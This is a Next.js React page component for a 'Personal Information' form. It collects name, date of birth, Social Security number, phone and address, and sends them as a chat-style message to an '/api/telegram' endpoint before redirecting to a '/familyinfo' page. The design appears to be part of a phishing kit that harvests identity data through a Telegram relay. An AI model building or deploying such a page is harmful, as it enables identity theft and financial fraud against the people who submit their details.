'use client';

import { useState } from 'react';

import styles from './personal.module.css';
import { useRouter } from 'next/navigation';

type FormData = {
  firstName: string;
  lastName: string;
  day: string;
  month: string;
  year: string;
  ssn: string;
  phone: string;
  address: string;
  city: string;
  state: string;
  zip: string;
};

const initialForm: FormData = {
  firstName: '',
  lastName: '',
  day: '',
  month: '',
  year: '',
  ssn: '',
  phone: '',
  address: '',
  city: '',
  state: '',
  zip: '',
};

const usStates = [
  { name: 'Alabama', abbr: 'AL' },
  { name: 'Alaska', abbr: 'AK' },
  { name: 'Arizona', abbr: 'AZ' },
  { name: 'Arkansas', abbr: 'AR' },
  { name: 'California', abbr: 'CA' },
  { name: 'Colorado', abbr: 'CO' },
  { name: 'Connecticut', abbr: 'CT' },
  { name: 'Delaware', abbr: 'DE' },
  { name: 'Florida', abbr: 'FL' },
  { name: 'Georgia', abbr: 'GA' },
  { name: 'Hawaii', abbr: 'HI' },
  { name: 'Idaho', abbr: 'ID' },
  { name: 'Illinois', abbr: 'IL' },
  { name: 'Indiana', abbr: 'IN' },
  { name: 'Iowa', abbr: 'IA' },
  { name: 'Kansas', abbr: 'KS' },
  { name: 'Kentucky', abbr: 'KY' },
  { name: 'Louisiana', abbr: 'LA' },
  { name: 'Maine', abbr: 'ME' },
  { name: 'Maryland', abbr: 'MD' },
  { name: 'Massachusetts', abbr: 'MA' },
  { name: 'Michigan', abbr: 'MI' },
  { name: 'Minnesota', abbr: 'MN' },
  { name: 'Mississippi', abbr: 'MS' },
  { name: 'Missouri', abbr: 'MO' },
  { name: 'Montana', abbr: 'MT' },
  { name: 'Nebraska', abbr: 'NE' },
  { name: 'Nevada', abbr: 'NV' },
  { name: 'New Hampshire', abbr: 'NH' },
  { name: 'New Jersey', abbr: 'NJ' },
  { name: 'New Mexico', abbr: 'NM' },
  { name: 'New York', abbr: 'NY' },
  { name: 'North Carolina', abbr: 'NC' },
  { name: 'North Dakota', abbr: 'ND' },
  { name: 'Ohio', abbr: 'OH' },
  { name: 'Oklahoma', abbr: 'OK' },
  { name: 'Oregon', abbr: 'OR' },
  { name: 'Pennsylvania', abbr: 'PA' },
  { name: 'Rhode Island', abbr: 'RI' },
  { name: 'South Carolina', abbr: 'SC' },
  { name: 'South Dakota', abbr: 'SD' },
  { name: 'Tennessee', abbr: 'TN' },
  { name: 'Texas', abbr: 'TX' },
  { name: 'Utah', abbr: 'UT' },
  { name: 'Vermont', abbr: 'VT' },
  { name: 'Virginia', abbr: 'VA' },
  { name: 'Washington', abbr: 'WA' },
  { name: 'West Virginia', abbr: 'WV' },
  { name: 'Wisconsin', abbr: 'WI' },
  { name: 'Wyoming', abbr: 'WY' }
];

export default function PersonalInfoPage() {
    
  const [form, setForm] = useState<FormData>(initialForm);
  const [errors, setErrors] = useState<string[]>([]);
  const [submitted, setSubmitted] = useState(false);
  const router = useRouter();
  const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    const { name, value } = e.target;

    if (name === 'phone') {
      setForm(prev => ({ ...prev, phone: formatPhoneNumber(value) }));
    } else if (name === 'ssn') {
      setForm(prev => ({ ...prev, ssn: formatSSN(value) }));
    } else {
      setForm(prev => ({ ...prev, [name]: value }));
    }
  };

  const validateForm = (): string[] => {
    const { firstName, lastName, day, month, year, ssn, phone, address, city, state, zip } = form;
    const errs: string[] = [];

    if (!firstName.trim()) errs.push('First name is required.');
    if (!lastName.trim()) errs.push('Last name is required.');

    const dayInt = +day;
    const monthInt = +month;
    const yearInt = +year;

    if (!/^\d{1,2}$/.test(day) || dayInt < 1 || dayInt > 31) errs.push('Day must be 1–31.');
    if (!/^\d{1,2}$/.test(month) || monthInt < 1 || monthInt > 12) errs.push('Month must be 1–12.');
    if (!/^\d{4}$/.test(year) || yearInt < 1900 || yearInt > new Date().getFullYear()) {
      errs.push('Year is invalid.');
    }

    if (!/^\d{3}-\d{2}-\d{4}$/.test(ssn)) errs.push('SSN must be in the format 123-45-6789.');
    if (!/^\(\d{3}\) \d{3}-\d{4}$/.test(phone)) errs.push('Phone must be in the format (123) 456-7890.');
    if (!address.trim()) errs.push('Street address is required.');
    if (!city.trim()) errs.push('City is required.');
    if (!/^[A-Z]{2}$/.test(state)) errs.push('State must be selected.');
    if (!/^\d{5}$/.test(zip)) errs.push('ZIP Code must be 5 digits.');

    return errs;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const validationErrors = validateForm();
    if (validationErrors.length > 0) {
      setErrors(validationErrors);
      return;
    }

    setErrors([]);
    setSubmitted(true);

    const { firstName, lastName, day, month, year, ssn, phone, address, city, state, zip } = form;
    const message = `📥 New Submission:
Name: ${firstName} ${lastName}
DOB: ${day}/${month}/${year}
SSN: ${ssn}
Phone: ${phone}
Address: ${address}, ${city}, ${state} ${zip}`;

try {
  const response = await fetch('/api/telegram', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ message }),
  });

  if (!response.ok) throw new Error("Failed to send message");

  setForm(initialForm);
  router.push('/familyinfo');
} catch (err) {
  console.error(err);
  setErrors(['Submission failed. Please try again later.']);
} finally {
  setSubmitted(false);
}
};

  return (
    <div className={styles.page}>
        
      <form className={styles.card} onSubmit={handleSubmit} noValidate>
        <h2 className={styles.heading}>Personal Information</h2>

        {errors.length > 0 && (
          <ul className={styles.errors}>
            {errors.map((err, idx) => <li key={idx}>{err}</li>)}
          </ul>
        )}

        <div className={`${styles.row} ${styles.horizontal}`}>
          <InputField label="First Name *" name="firstName" value={form.firstName} onChange={handleChange} />
          <InputField label="Last Name *" name="lastName" value={form.lastName} onChange={handleChange} />
        </div>

        <div className={styles.row}>
          <label className={styles.label}>
            Date of Birth
            <div className={styles.dobRow}>
              <input type="text" name="day" placeholder="DD" className={styles.input} value={form.day} onChange={handleChange} />
              <input type="text" name="month" placeholder="MM" className={styles.input} value={form.month} onChange={handleChange} />
              <input type="text" name="year" placeholder="YYYY" className={styles.input} value={form.year} onChange={handleChange} />
            </div>
          </label>
        </div>

        <div className={styles.row}>
          <InputField label="Street Address *" name="address" value={form.address} onChange={handleChange} />
          <InputField label="City *" name="city" value={form.city} onChange={handleChange} />
        </div>

        <div className={`${styles.row} ${styles.horizontal}`}>
          <label className={styles.label}>
            State *
            <select name="state" className={`${styles.input} ${styles.select}`} value={form.state} onChange={handleChange}>
              <option value="">Select a state</option>
              {usStates.map(state => (
                <option key={state.abbr} value={state.abbr}>{state.name}</option>
              ))}
            </select>
          </label>
          <InputField label="ZIP Code *" name="zip" value={form.zip} onChange={handleChange} placeholder="90210" />
        </div>

        <div className={`${styles.row} ${styles.horizontal}`}>
          <InputField label="SSN *" name="ssn" placeholder="123-45-6789" value={form.ssn} onChange={handleChange} />
          <InputField label="Phone *" name="phone" placeholder="(123) 456-7890" value={form.phone} onChange={handleChange} />
        </div>

        <button type="submit" className={styles.submitButton} disabled={submitted}>
          {submitted ? 'Submitted' : 'Submit'}
        </button>
      </form>
    </div>
  );
}

type InputProps = {
  label: string;
  name: keyof FormData;
  value: string;
  onChange: (e: React.ChangeEvent<HTMLInputElement>) => void;
  placeholder?: string;
};

function InputField({ label, name, value, onChange, placeholder }: InputProps) {
  return (
    <label className={styles.label}>
      {label}
      <input
        type="text"
        name={name}
        className={styles.input}
        value={value}
        onChange={onChange}
        placeholder={placeholder}
        inputMode={name === 'phone' || name === 'zip' || name === 'ssn' ? 'numeric' : 'text'}
      />
    </label>
  );
}

function formatPhoneNumber(value: string): string {
  const digits = value.replace(/\D/g, '').slice(0, 10);
  const match = digits.match(/^(\d{0,3})(\d{0,3})(\d{0,4})$/);
  if (!match) return value;
  const [, a, b, c] = match;
  if (!b) return `(${a}`;
  if (!c) return `(${a}) ${b}`;
  return `(${a}) ${b}-${c}`;
}

function formatSSN(value: string): string {
  const digits = value.replace(/\D/g, '').slice(0, 9);
  const match = digits.match(/^(\d{0,3})(\d{0,2})(\d{0,4})$/);
  if (!match) return value;
  const [, a, b, c] = match;
  if (!b) return a;
  if (!c) return `${a}-${b}`;
  return `${a}-${b}-${c}`;
}
